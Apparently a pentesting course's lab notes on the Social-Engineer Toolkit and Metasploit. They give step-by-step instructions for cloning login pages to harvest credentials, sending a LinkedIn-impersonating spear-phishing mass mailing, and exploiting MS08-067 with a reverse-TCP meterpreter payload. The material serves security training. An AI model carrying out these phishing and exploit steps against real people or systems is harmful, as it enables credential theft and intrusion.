# Exploitation

[Home](README.md)

## Social Engineering Toolkit

<details>

### Install if necessary

    git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
    cd setoolkit
    pip3 install -r requirements.txt
    python setup.py

### Credential Harvester

Credential Harvester clones a website and starts a web server to host this
phishing site. A victim visits the cloned websites and attempts
to log in using legitimate credentials.

The victim's credentials are sent back to SET in plain text.

Run `setoolkit` to open SET

Choose option 2, 'Website attack vectors'

Choose option 3, 'Credential Harvester Attack Method'

Choose a template or provide a custom import url (Note: The web page must use the POST method and have username and password fields)

SET starts the web server and hosts the clone site, waiting for a victim to put in credentials

[PentestLab Reference](https://pentestlab.blog/2012/04/17/qrcode-attack-vector/)

### QR Code Creator

QR Code Creator creates a qr code that can be used to redirect victims to a cloned website for credential harvesting

Run `setoolkit` to open SET

Choose option 9, 'QRCode Generator Attack Vector'

Provide the url you would like to use for the QR Code redirect

SET will save the QR Code as a png file and provide the path in the console

[PentestLab Reference](https://pentestlab.blog/2012/04/17/qrcode-attack-vector/)

### Mass Mailer Exploit: Lab Demo

#### Information Gathering for Spear Phishing Attack

You could gather targets by using theHarvester

    theHarvester -d <targetdomain> -b google

If the company uses full names in their email addresses, it would be easy to pull public social media information via tools like userrecon (Links to an external site.)  or Social Mapper (Links to an external site.)

For this demo I didn't target any real email addresses or use a public email service

#### Create Phishing Email Template

Once you have a social media platform chosen, use Metasploit to clone the login page and host on your kali vm.

Use examples of real social media emails to create the email body template in html, with the main call to action pointing to your listeners.

Save a copy of a legitimate email

Open the .eml or .msg file in a rich text editor like VS Code, Notepad++ or Sublime

Pull the html out of the message and tweak as needed. Replace image references if necessary and replace the links with those of your cloned social media login page.

Copy the modified html body and save it.

Set Up Email Server / Target Mailbox

#### Create new user

``useradd -m -s /bin/bash <username>``
``passwd <username>``
``<enter and confirm password>``

#### Install a mail server

``apt -y install postfix``

Choose Local only

Specify sender domain (something like linkedininvitations.com)

``sudo nano /etc/postfix/virtual``
``@localhost <your-user>``
``@localhost.com <your-user>``
``sudo nano /etc/postfix/main.cf``
``virtual_alias_maps = hash:/etc/postfix/virtual``
``sudo postmap /etc/postfix/virtual``
`sudo systemctl restart postfix``

#### Install a mail client like thunderbird

``Apt -y install thunderbird``

Launch thunderbird from the application menu

Cancel the initial account setup screen

In the accounts / folders area on the left, right click local folders and choose settings

For outgoing server (SMTP), click Add

Description = localhost

Server Name = localhost

Port = 25

Connection security = none

Authentication method = No authentication

In the bottom of the account settings box, choose Account actions > Add other account

Choose Unix Mailspool

Enter your name and the email address for the local account you created

Justin

justin@localhost

Click next to select the outgoing server you created

Enter a name for the account

Click finish

You should now be able to send receive email within thunderbird for the new local account.

Send yourself a test email to verify. You will see an error related to a mailspool until you send an email to yourself one time. This is normal.

#### Execute Mass Mailing Campaign

Open SET by typing `setoolkit` in a bash shell

Choose 1 for Social-Engineering Attacks

Choose 5 for Mass Mailer Attack

If you want to just target one email address at a time to conduct a spear phishing attack, choose 1, otherwise to conduct a mass mailed phishing attack, choose 2

If you choose the mass email, youâ€™ll need to specify the full path to a text file containing all the target email addresses, otherwise enter the target email address

Choose to use your own server when prompted

Enter a believable from address (donotreply@LinkedInInvitations.com)

Enter a from name (LinkedIn)

Press enter to set a blank username for the email relay

Press enter to set a blank password for the email relay

Enter localhost for the smtp server address

Enter 25 for the smtp port

Enter yes or no for high priority flag

Enter yes or no to attach a file

Enter yes or no to attach and inline file

Enter the Email subject

Choose h for html

Copy and paste the html you modified in step 4

At the end, type END and press enter

Your phishing email will now be sent to the target address(es) you specified

You can open your thunderbird client and click Get Messages to see your phishing emails.

</details>

## Metasploit

<details>

### Terms

* Exploit: Module that uses a payload. Auxillary module has no payload
* Payload: Code that runs remotely. Can use encoder and nops to hide code from AB
* Modules: /usr/share/metasploit-framework/modules/ . Written in Ruby

### Setup

From Kali:

`apt update`
`service postgresql start`
`msfdb init`

### Workspaces

    workspace -a <newname>
    workspace -d <deletename>
    workspace name
    workspace -h

### Basic Usage

    show exploits
    show auxiliary
    show options
    show targets

### MS08-067

    search ms08_067_netapi
    Use exploit/windows/smb/ms08_067_netapi
    Set payload windows/meterpreter/reverse_tcp
    Show targets
    Set target 2
    Set RHOST [target machine ip]
    Set LHOST [Kali machine ip]
    Set LPORT [port]
    Show options
    Exploit
    shell

### WMap

    use wmap
Loads the msfcrawler/wmap module

    info
Shows options available to set for this module

    set RHOSTS 192.168.8.133
Sets the target host ip. Could be ip, ip range

    run
Runs the vulnerability scan against the RHOSTS ip or ip range

    vulns
Shows discovered vulnerabilities

Alternatively, you could run wmap commands directly using the wmap plugin. This allows us to target a specific set of URLs instead.

    load wmap
Loads the wmap plugin

    wmap_sites -a http://192.168.8.133 (Links to an external site.)
Adds a target host root

    wmap_sites -l
Shows host root list

    wmap_targets -t http://192.168.8.133/vicnum/ (Links to an external site.)
Adds target web apps to job scope list

    wmap_run -t
Shows active modules

    wmap_run -e
Runs the active modules against the targets list

    vulns
Shows discovered vulnerabilities

[Rapid7 MSFCrawler](https://www.rapid7.com/db/modules/auxiliary/crawler/msfcrawler)

[Offensive Security WMap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/)

[Null Byte WMap](https://null-byte.wonderhowto.com/how-to/use-metasploits-wmap-module-scan-web-applications-for-common-vulnerabilities-0187572/)

[Infosec Institute Vulnerability Scanning with Metasploit](https://resources.infosecinstitute.com/vulnerability-scanning-metasploit-part-ii/#gref)

[SET GitHub](https://github.com/trustedsec/social-engineer-toolkit)

[SET Tutorial](https://github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User_Manual.pdf)
